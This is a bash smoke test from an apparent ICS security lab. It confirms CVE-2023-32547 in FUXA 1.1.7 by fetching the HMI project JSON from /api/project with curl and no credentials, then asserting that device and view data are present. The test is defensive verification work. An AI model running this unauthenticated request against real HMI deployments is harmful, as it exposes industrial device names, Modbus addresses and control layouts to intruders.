#!/usr/bin/env bash
# CVE-2023-32547. FUXA 1.1.7's /api/project route reads the active HMI
# project including its device list, view layout, and server identity.
# The route is protected by a JWT verifier that allows the anonymous role
# by default, so any caller with network reach to :1881 lifts the full
# project JSON without credentials. From eng-ws's control NIC the HMI is
# one curl away.
#
# GET /api/project returns the devices and hmi.views subsets of the stored
# project. In a configured deployment this exposes device names, Modbus
# addresses, and view layout; in the seeded lab it exposes the bare
# structure. The unauthenticated 200 is the vulnerability.
#
# Coverage:
#   Stage 1  :1881 reachable from eng-ws
#   Stage 2  GET /api/project returns 200 with the devices and hmi objects
#   Stage 3  the response contains the hmi view structure, no auth required
#
# Usage: bash tests/smoke/test_fuxa_unauth_project_access.sh
set -uo pipefail

REPO="$(cd "$(dirname "$0")/../.." && pwd)"
source "$REPO/tests/smoke/lib.sh"

ENG_WS="uupl-eng-ws"
FUXA_IP="10.10.3.10"
FUXA_PORT=1881

require_running "$ENG_WS"
require_running "uupl-hmi"

echo "[fuxa-proj] Stage 0: FUXA :$FUXA_PORT reachable from eng-ws control NIC"
if ! wait_for_port "$ENG_WS" "$FUXA_IP" "$FUXA_PORT" 10; then
    echo "  [skip] FUXA :$FUXA_PORT not reachable; lab needs './ctl down && ./ctl up'."
    exit 2
fi
ok "FUXA HTTP :$FUXA_PORT reachable"

echo "[fuxa-proj] Stage 2: GET /api/project returns a JSON project body"
PROJ="$(in_container "$ENG_WS" curl -s "http://$FUXA_IP:$FUXA_PORT/api/project")"
assert_contains "$PROJ" '"devices"'  "response carries devices object"
assert_contains "$PROJ" '"hmi"'      "response carries hmi object"
assert_contains "$PROJ" '"views"'    "response carries views list"

echo "[fuxa-proj] Stage 3: project structure exposed without credentials"
# The response must be non-trivial JSON (brace-enclosed, non-empty). A
# 401 or redirect would produce no braces or an HTML body.
assert_contains "$PROJ" '^\{' "response is a JSON object, not an error or redirect"
# The hmi.views key is always present in a FUXA project, even when empty.
# In a configured HMI this array holds view names, widget layouts, and device
# bindings — all readable by any network-reachable caller with no token.
assert_contains "$PROJ" '"views":\[\]' "hmi.views present and readable without a token"

summary
